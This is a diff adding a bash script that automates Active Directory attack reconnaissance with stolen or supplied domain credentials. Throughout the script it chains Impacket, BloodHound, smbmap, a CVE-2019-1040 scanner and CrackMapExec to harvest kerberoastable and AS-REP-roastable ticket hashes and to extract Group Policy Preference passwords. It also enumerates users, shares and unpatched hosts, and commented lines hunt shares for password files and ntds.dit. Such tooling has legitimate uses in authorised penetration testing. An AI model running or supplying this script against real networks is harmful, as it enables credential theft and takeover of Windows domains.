@@ -1,0 +1,210 @@
+#!/bin/bash
+
+IMPACKETSCRIPTS="/opt/outils/windows/impacket/build/scripts-3.9"
+DROPTHEMICSCANNER="/opt/outils/exploit/cve-2019-1040-scanner/scan.py"
+SMBCRUNCHDIR="/opt/outils/windows/SMBCrunch/"
+GODDI="/opt/outils/windows/goddi/goddi-linux-amd64"
+LDAPSCANNER="/opt/outils/windows/ldap-scanner/ldap-scanner.py"
+#TODO: check that the user has the tools installed or the script can find them
+
+if [ ! -x $(which bloodhound-python) ]; then
+  echo "python-bloodhound not installed or cannot be found in the path"
+  exit 1
+fi
+if [ ! -x $(which smbmap) ]; then
+  echo "smbmap not installed or cannot be found in the path"
+  exit 1
+fi
+"$IMPACKETSCRIPTS/GetADUsers.py" &> /dev/null
+result=$?
+if [ $result != 1 ]; then
+  echo "Impacket scripts cannot be found at the specified PATH"
+  echo "Update the variable accordingly"
+  exit 1
+fi
+"$GODDI" &> /dev/null
+result=$?
+if [ $result != 1 ]; then
+  echo "Goddi cannot be found at the specified PATH"
+  echo "Update the variable accordingly"
+  exit 1
+fi
+python3 "$DROPTHEMICSCANNER" &> /dev/null
+result=$?
+if [ $result != 1 ]; then
+  echo "cve-2019-1040-scanner cannot be found at the specified PATH"
+  echo "Update the variable accordingly"
+  exit 1
+fi
+
+
+printusage(){
+	echo "USAGE:
+	$0 USERNAME PASSWORD FULLDOMAIN_NAME SMBHOSTSFILE [DCIP]
+	
+	Do all possible recon on a windows AD with user valid creds
+"
+}
+
+isAccountValid(){
+	DCIP="$1"
+	USERNAME="$2"
+	PASSWORD="$3"
+	DOMAIN="$4"
+	smbmap -H "$DCIP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" | grep "User SMB session established"
+	return $?
+}
+
+isValidArgument(){
+	#Verify if argument is empty or begins with a '-' char
+	argument="$1"
+	if [ "$argument" == "" -o "${argument:0:1}" == "-" ]; then
+		echo "Invalid argument value $1"
+		return 1
+	fi
+	return 0
+}
+
+# A POSIX variable
+OPTIND=1         # Reset in case getopts has been used previously in the shell.
+# Initialize our own variables:
+USERNAME=""
+PASSWORD=""
+DOMAIN=""
+HOSTFILE=""
+DCIP=""
+while getopts "h?vupdic:" opt; do
+	case "$opt" in
+		h|\?)	printusage
+			exit 1
+			;;
+		v)  verbose=1
+			;;
+		u)  USERNAME="${OPTARG}"
+			echo $USERNAME
+			;;
+		p)  PASSWORD="$OPTARG"
+			;;
+		d)  DOMAIN="$OPTARG"
+			;;
+		i)  HOSTFILE="$OPTARG"
+			;;
+		c)  DCIP="$OPTARG"
+			;;
+	esac
+done
+shift $((OPTIND-1))
+[ "${1:-}" = "--" ] && shift
+
+USERNAME="$1"
+PASSWORD="$2"
+DOMAIN="$3"
+HOSTFILE="$4"
+DCIP="$5"
+
+if [ "$USERNAME" = "" -o "$PASSWORD" == "" -o "$DOMAIN" == "" -o "$HOSTFILE" == "" ]; then
+	echo "Missing arguments"
+	printusage
+	exit 1
+fi
+
+
+DATE=$(date +"%Y%m%d-%H-%M")
+#TODO add option to override the OUTPUTDIR
+OUTPUTDIR="./autoADRecon_${DATE}"
+LOGFILE="$OUTPUTDIR/autoADRecon_${DATE}.log"
+
+
+
+if [ "$DCIP" == "" ]; then
+	#if not provided determine automatically the DC IP
+	DCIP=$(host "$DOMAIN" | grep "has address" | cut -d ' ' -f 4 | head -1)
+	if [ "$DCIP" == "" ]; then
+		echo "Can't find the DC automatically, please provide it"
+		exit 1
+	fi
+fi
+#Test that the account is valid
+if ! isAccountValid "$DCIP" "$USERNAME" "$PASSWORD" "$DOMAIN"; then
+	echo "Can't connect with supplied credentials ($USERNAME) to $DCIP ($DOMAIN)"
+	exit 1
+fi
+
+mkdir "$OUTPUTDIR" || exit
+
+#Do the GPP check
+#TODO
+
+#List domain Controllers again
+host "$DOMAIN" | grep "has address" | cut -d ' ' -f 4 | tee "$OUTPUTDIR/domainControllers.list"
+
+#AD recon
+echo "
+Fetching Bloodhound data from the AD:"
+mkdir "$OUTPUTDIR/bloodhound" || exit
+cd "$OUTPUTDIR/bloodhound" || exit
+bloodhound-python -u "${USERNAME}@${DOMAIN}" -p "$PASSWORD" -c All,LoggedOn | tee -a "../../$LOGFILE"
+cd ../../ || exit
+
+#get the user list
+echo "
+Fetching AD Users List:" | tee -a "$LOGFILE"
+"$IMPACKETSCRIPTS/GetADUsers.py"  -all "$DOMAIN/$USERNAME:$PASSWORD" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/allUsersList.out"
+#
+echo "
+Fetching AD infos:" | tee -a "$LOGFILE"
+"$GODDI" -username "$USERNAME" -password "$PASSWORD" -domain "$DOMAIN" -dc "$DOMAIN" -unsafe 2>&1 | tee -a "$LOGFILE"
+#TODO check result and get the following folder from the output of the tool
+mv /opt/outils/windows/goddi/csv/ "$OUTPUTDIR/goddi-csv" | tee -a "$LOGFILE"
+
+#extract UserSPN TGS tickets
+echo "
+Fetching User SPN TGSs:" | tee -a "$LOGFILE"
+#TODO no timeout option supported by impacket :(
+"$IMPACKETSCRIPTS/GetUserSPNs.py"  -request "$DOMAIN/$USERNAME:$PASSWORD" | tee -a "$LOGFILE" | tee "$OUTPUTDIR/userSPNs.out"
+#extract TGTs without kerberos pre-auth
+echo "
+Fetching TGTs of users without pre-auth:" | tee -a "$LOGFILE"
+"$IMPACKETSCRIPTS/GetNPUsers.py" "$DOMAIN/$USERNAME:$PASSWORD" -request | tee -a "$LOGFILE" | tee "$OUTPUTDIR/preAuthUsers.out"
+
+
+#Find unpatched systems:
+echo "
+Look for unpatched systems:" | tee -a "$LOGFILE"
+python3 "$DROPTHEMICSCANNER" "$DOMAIN/$USERNAME:$PASSWORD@" -target-file "$HOSTFILE" 2>&1 | tee -a "$LOGFILE"  | tee "$OUTPUTDIR/dropthemicVulnerableHosts.out"
+
+#List domain controllers
+echo "
+Look for LDAP signing on domain controllers" | tee -a "$LOGFILE"
+python3 "$LDAPSCANNER" "$DOMAIN/$USERNAME:$PASSWORD@" -target-file "$OUTPUTDIR/domainControllers.list" 2>&1 | tee -a "$LOGFILE"  | tee "$OUTPUTDIR/ldapSigningDCs.out"
+
+#list all accessible shares
+echo "
+List all accessible shares" | tee -a "$LOGFILE"
+smbmap --host-file "$HOSTFILE" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" | tee -a "$LOGFILE"  | tee "$OUTPUTDIR/smbmapAll.out"
+#TODO: HOSTFILE is too large and inefficient in large networks. smbhosts file would be better here
+#"$SMBCRUNCHDIR/SMBHunt.pl" -i "$HOSTFILE" -o "$OUTPUTDIR/smbhunt.out" -a "$DOMAIN\\$USERNAME:$PASSWORD" | tee -a "$LOGFILE"
+#list all files in thoses shares
+#"$SMBCRUNCHDIR/SMBList.pl" -c "$DOMAIN\\$USERNAME:$PASSWORD" -s "$OUTPUTDIR/smbhunt.out" -o "$OUTPUTDIR/smblist.out" | tee -a "$LOGFILE"
+#search for interesting file names in the output
+#grep -i passw "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+#grep -i pwd "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+#grep -i cred "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+#grep -i .kdbx "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+#grep -i "shadow " "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+#grep -i ntdis.dit "$OUTPUTDIR/smblist.out/ALL_COMBINED_RESULTS.txt"
+
+#Search for quick wins
+#First, dig for gpp passwords
+echo "
+Looking for passwords in GPPs" | tee -a "$LOGFILE"
+cme smb "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -M gpp_password | tee -a "$LOGFILE" | tee "$OUTPUTDIR/gppScan.out"
+cme smb "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" -M gpp_autologin | tee -a "$LOGFILE" | tee -a "$OUTPUTDIR/gppScan.out"
+
+#Get MachineAccountQuota attribute
+echo "
+Get MachineAccountQuota attribute:" | tee -a "$LOGFILE"
+cme ldap "$DCIP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M MAQ
+
+
+exit 0
